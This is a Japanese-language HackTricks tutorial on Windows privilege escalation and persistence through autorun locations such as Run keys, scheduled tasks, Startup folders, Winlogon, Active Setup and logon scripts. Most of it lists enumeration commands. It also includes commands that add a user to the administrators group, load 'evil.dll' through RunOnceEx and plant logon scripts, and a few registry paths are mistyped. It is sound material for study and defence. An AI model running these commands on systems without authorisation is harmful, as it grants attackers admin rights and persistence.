# Autoruns による Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** は **startup** 時にプログラムを実行するために使用できます。**startup** 時に実行されるよう設定されているバイナリを確認するには、次を実行します：
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Scheduled Tasks

**Tasks** は**一定の頻度**で実行されるようにスケジュール設定できます。実行がスケジュールされているバイナリを確認するには:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## フォルダ

**Startup フォルダに配置されたすべてのバイナリは、startup 時に実行されます**。一般的な Startup フォルダは以下に示すものですが、Startup フォルダはレジストリで指定されています。[場所についてはこちらを参照してください。](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **deposit payloads directly inside these Startup folders during decompression**, resulting in code execution on the next user logon. For a deep-dive into this technique see:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## レジストリ

> [!TIP]
> [ここからの注記](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** レジストリエントリは、64-bit Windows versionを実行していることを示します。オペレーティングシステムは、このキーを使用して、64-bit Windows version上で実行される32-bit application向けに、HKEY_LOCAL_MACHINE\SOFTWAREの分離されたビューを表示します。

### Runs

**一般に知られている** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** および **RunOnce** として知られるregistry keyは、userがsystemにログインするたびにprogramを自動的に実行するよう設計されています。keyのdata valueに割り当てられるcommand lineは、260文字以下に制限されています。<sup>[[2]](#references)</sup>

**Service runs** (boot中のserviceの自動startupを制御可能):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista以降のversionでは、**Run** および **RunOnce** registry keyは自動的に生成されません。これらのkeyのentryは、programを直接起動することも、依存関係として指定することもできます。例えば、logon時にDLL fileをloadするには、**RunOnceEx** registry keyと「Depend」keyを使用できます。これは、systemのstart-up中に「C:\temp\evil.dll」を実行するregistry entryを追加することで実現できます。<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: **HKLM** 内で、言及されている registry のいずれかに書き込み可能な場合、別の user がログインしたときに privileges を escalate できます。

> [!TIP]
> **Exploit 2**: **HKLM** 内のいずれかの registry で指定されている binaries を overwrite できる場合、別の user がログインしたときに、その binary を backdoor 付きで modify して privileges を escalate できます。
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** フォルダーに配置されたショートカットは、ユーザーのログオン時またはシステムの再起動時にサービスやアプリケーションを自動的に起動します。**Startup** フォルダーの場所は、**Local Machine** と **Current User** の両方のスコープについてレジストリで定義されています。つまり、指定された **Startup** の場所にショートカットを追加すると、ログオンまたは再起動の処理後にリンク先のサービスやプログラムが確実に起動するため、プログラムを自動実行するための簡単な方法となります。<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> **HKLM** 配下の任意の \[User] Shell Folder を上書きできる場合、そこを自分が管理するフォルダーに指定し、ユーザーがシステムにログインするたびに実行されて権限を昇格させる backdoor を配置できます。
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

この per-user registry value には、その user が log on したときに実行される script または command を指定できます。主に **persistence** の primitive です。影響を受ける user の context でのみ実行されるためですが、post-exploitation や autoruns の review では確認する価値があります。<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> current user に対してこの value に書き込みできる場合、admin rights がなくても、次回の interactive logon 時に execution を再トリガーできます。別の user hive に書き込みできる場合は、その user の logon 時に code execution を得られる可能性があります。
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notes:

- target user がすでに読み取り可能な `.bat`、`.cmd`、`.ps1`、またはその他の launcher ファイルには、フルパスを使用することを推奨します。
- これは、値が削除されるまで logoff/reboot 後も維持されます。
- `HKLM\...\Run` とは異なり、これだけで elevation が付与されるわけではありません。これは user-scope persistence です。

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

通常、**Userinit** key には **userinit.exe** が設定されています。ただし、この key が変更されると、指定された executable も user logon 時に **Winlogon** によって起動されます。同様に、**Shell** key には **explorer.exe** を指定することが意図されています。これは Windows のデフォルト shell です。<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> レジストリ値または binary を上書きできる場合、privileges を escalate できます。

### ポリシー設定

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** key を確認します。
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Safe Mode の Command Prompt を変更する

Windows Registry の `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` には、デフォルトで `cmd.exe` に設定された **`AlternateShell`** value があります。これは、startup 時に「Safe Mode with Command Prompt」を選択すると（F8 を押して）、`cmd.exe` が使用されることを意味します。ただし、F8 を押して手動で選択しなくても、コンピューターが自動的にこの mode で起動するように設定できます。

「Safe Mode with Command Prompt」を自動的に起動する boot option を作成する手順:<sup>[[5]](#references)</sup>

1. `boot.ini` file の attributes を変更し、read-only、system、hidden flags を削除します: `attrib c:\boot.ini -r -s -h`
2. `boot.ini` を開いて編集します。
3. 次のような行を挿入します: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` への変更を保存します。
5. 元の file attributes を再適用します: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** registry key を変更すると、custom command shell を設定でき、unauthorized access に悪用される可能性があります。
- **Exploit 2 (PATH Write Permissions):** system の **PATH** variable のいずれかの部分、特に `C:\Windows\system32` より前の部分に write permissions があると、custom `cmd.exe` を実行できます。これは、system が Safe Mode で起動された場合に backdoor になる可能性があります。
- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini` への write access があると、Safe Mode の自動 startup が可能になり、次回の reboot 時に unauthorized access を容易にします。

現在の **AlternateShell** 設定を確認するには、次の commands を使用します:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### インストール済みコンポーネント

Active Setup は、**デスクトップ環境が完全に読み込まれる前に開始される** Windows の機能です。特定のコマンドの実行を優先し、それらが完了してからユーザーのログオン処理が続行されます。このプロセスは、Run や RunOnce レジストリセクションなど、他のスタートアップエントリがトリガーされるよりも前に実行されます。

Active Setup は、以下のレジストリキーによって管理されます。

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

これらのキーには複数のサブキーが存在し、それぞれが特定のコンポーネントに対応しています。特に注目すべきキーの値は次のとおりです。

- **IsInstalled:**
- `0` は、コンポーネントのコマンドが実行されないことを示します。
- `1` は、ユーザーごとにコマンドが 1 回実行されることを意味します。`IsInstalled` の値が存在しない場合のデフォルト動作もこれです。
- **StubPath:** Active Setup によって実行されるコマンドを定義します。`notepad` の起動など、有効な任意のコマンドラインを指定できます。

**Security Insights:**

- **`IsInstalled`** が `"1"` に設定され、特定の **`StubPath`** が指定されたキーを変更または書き込み可能な場合、不正なコマンド実行につながり、潜在的に privilege escalation が可能になります。
- 十分な権限があれば、いずれかの **`StubPath`** 値で参照されている binary file を変更することでも privilege escalation が可能です。

Active Setup のコンポーネント全体で **`StubPath`** の設定を確認するには、次のコマンドを使用できます。
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Browser Helper Objects (BHO)の概要

Browser Helper Objects (BHO)は、MicrosoftのInternet Explorerに追加機能を提供するDLLモジュールです。Internet ExplorerおよびWindows Explorerの起動時に読み込まれます。ただし、**NoExplorer**キーを1に設定することで実行をブロックでき、Windows Explorerのインスタンスとともに読み込まれないようにできます。<sup>[[1]](#references)</sup>

BHOはInternet Explorer 11を介してWindows 10と互換性がありますが、新しいバージョンのWindowsにおけるデフォルトブラウザであるMicrosoft Edgeではサポートされていません。

システムに登録されているBHOを確認するには、次のregistry keysを調査します。

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

各BHOはregistry内で**CLSID**によって表され、固有のidentifierとして機能します。各CLSIDの詳細情報は、`HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`の下にあります。

registry内のBHOを検索するには、次のcommandsを使用できます。
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

レジストリには各 dll ごとに 1 つの新しいレジストリ エントリが含まれ、**CLSID** によって表されます。CLSID の情報は `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` で確認できます。

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

autoruns を確認できるすべてのサイトは、**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) によってすでに検索されている**ことに注意してください。ただし、**自動実行される**ファイルの一覧をより包括的に確認するには、Sysinternals の [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)を使用できます。
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## その他

**[https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) でレジストリなどの Autoruns をさらに確認**<sup>[[4]](#references)</sup>

## 参考文献

- [1] [一般的な malware persistence mechanisms](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart categories (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [代替シェルを起動する boot option を追加するには](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)

{{#include ../../banners/hacktricks-training.md}}
